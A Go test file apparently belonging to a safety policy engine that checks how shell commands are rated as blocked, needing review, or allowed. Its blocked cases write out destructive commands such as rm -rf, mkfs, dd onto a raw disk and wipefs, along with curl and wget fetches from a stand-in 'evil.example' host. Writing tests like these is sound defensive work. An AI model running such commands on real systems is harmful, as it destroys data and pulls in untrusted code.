package policy

import "testing"

// TestSingleCommandVerdicts checks that individual commands get the
// expected action from the rule set.
func TestSingleCommandVerdicts(t *testing.T) {
	cases := []struct {
		name    string
		command string
		want    Action
	}{
		// --- should be BLOCKED ---
		{"recursive force delete", "rm -rf /var/data", ActionBlock},
		{"recursive force delete grouped", "rm -fr /tmp/cache", ActionBlock},
		{"filesystem format", "mkfs.ext4 /dev/sdb1", ActionBlock},
		{"raw disk write", "dd if=/dev/zero of=/dev/sda", ActionBlock},
		{"outbound fetch curl", "curl http://evil.example/script.sh", ActionBlock},
		{"outbound fetch wget", "wget http://evil.example/x", ActionBlock},
		{"disk wipe", "wipefs -a /dev/sdb", ActionBlock},

		// --- should need REVIEW ---
		{"firewall change", "iptables -A INPUT -j DROP", ActionReview},
		{"process kill", "kill -9 4321", ActionReview},
		{"system config edit", "vi /etc/ssh/sshd_config", ActionReview},
		{"package install", "dnf install nginx", ActionReview},
		{"service stop", "systemctl stop nginx", ActionReview},
		{"reboot", "reboot", ActionReview},

		// --- should be ALLOWED ---
		{"service status", "systemctl status nginx", ActionAllow},
		{"service restart", "systemctl restart myapp", ActionAllow},
		{"list directory", "ls -la /var/log", ActionAllow},
		{"disk usage check", "df -h", ActionAllow},
	}

	engine := NewEngine()
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			decision := engine.Evaluate([]string{tc.command})
			got := decision.Findings[0].Action
			if got != tc.want {
				t.Errorf("command %q: got action %s, want %s",
					tc.command, got, tc.want)
			}
		})
	}
}

// TestPlanEscalatesToWorstCommand verifies that a plan's verdict equals
// its most dangerous command, not an average.
func TestPlanEscalatesToWorstCommand(t *testing.T) {
	engine := NewEngine()

	// Four harmless commands and one destructive one.
	plan := []string{
		"systemctl status nginx",
		"df -h",
		"rm -rf /important/data", // the dangerous one
		"ls /tmp",
		"systemctl restart myapp",
	}

	decision := engine.Evaluate(plan)
	if decision.Verdict != VerdictBlocked {
		t.Errorf("plan with one destructive command: got %s, want blocked",
			decision.Verdict)
	}
}

// TestEmptyCommandNeedsReview ensures an empty command is never
// silently allowed.
func TestEmptyCommandNeedsReview(t *testing.T) {
	engine := NewEngine()
	decision := engine.Evaluate([]string{"   "})
	if decision.Findings[0].Action != ActionReview {
		t.Errorf("empty command: got %s, want review",
			decision.Findings[0].Action)
	}
}
